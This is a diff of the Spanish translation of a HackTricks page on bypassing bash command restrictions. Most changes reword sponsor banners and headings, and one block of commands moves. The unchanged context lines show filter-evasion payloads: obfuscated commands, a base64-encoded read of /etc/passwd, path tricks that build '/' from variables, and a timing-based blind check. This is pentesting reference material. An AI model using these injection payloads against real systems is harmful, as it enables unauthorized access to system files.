@@ -6,8 +6,8 @@
 
 Otras formas de apoyar a HackTricks:
 
-* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
@@ -17,12 +17,12 @@ Otras formas de apoyar a HackTricks:
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Utiliza [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias **más avanzadas** del mundo.\
-Obtén Acceso Hoy:
+Utiliza [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias **más avanzadas** del mundo.\
+¡Accede hoy mismo:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
 
-## Saltos Comunes de Limitaciones
+## Saltos Comunes para Evadir Limitaciones
 
 ### Shell Inverso
 ```bash
@@ -75,13 +75,18 @@ $(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
 $(rev<<<'imaohw') #whoami
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64
 
-
 # Execution through $0
 echo whoami|$0
 
 # Uninitialized variables: A uninitialized variable equals to null (nothing)
 cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
 p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters
+
+# New lines
+p\
+i\
+n\
+g # These 4 lines will equal to ping
 
 # Fake commands
 p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
@@ -116,17 +121,11 @@ X=$'cat\x20/etc/passwd'&&$X
 # Using tabs
 echo "ls\x09-l" | bash
 
-# New lines
-p\
-i\
-n\
-g # These 4 lines will equal to ping
-
 # Undefined variables and !
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Saltar barra invertida y barra diagonal
+### Saltar la barra invertida y la barra diagonal
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
@@ -154,7 +153,7 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### Obtener caracteres de variables de entorno
+### Obteniendo caracteres de Variables de Entorno
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
@@ -319,7 +318,7 @@ ln /f*
 ```
 ## Bypass de Restricciones de Bash
 
-Si te encuentras dentro de un sistema de archivos con las protecciones de solo lectura y noexec o incluso en un contenedor distroless, aún hay formas de **ejecutar binarios arbitrarios, ¡incluso un shell!:**
+Si te encuentras dentro de un sistema de archivos con las protecciones de **solo lectura y noexec** o incluso en un contenedor distroless, aún hay formas de **ejecutar binarios arbitrarios, ¡incluso un shell!:**
 
 {% content-ref url="bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](bypass-fs-protections-read-only-no-exec-distroless/)
@@ -341,8 +340,8 @@ Si te encuentras dentro de un sistema de archivos con las protecciones de solo l
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Utiliza [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias más avanzadas del mundo.\
-Accede hoy mismo:
+Utiliza [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias **más avanzadas del mundo**.\
+Obtén acceso hoy:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
 
@@ -352,8 +351,8 @@ Accede hoy mismo:
 
 Otras formas de apoyar a HackTricks:
 
-* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, ¡consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
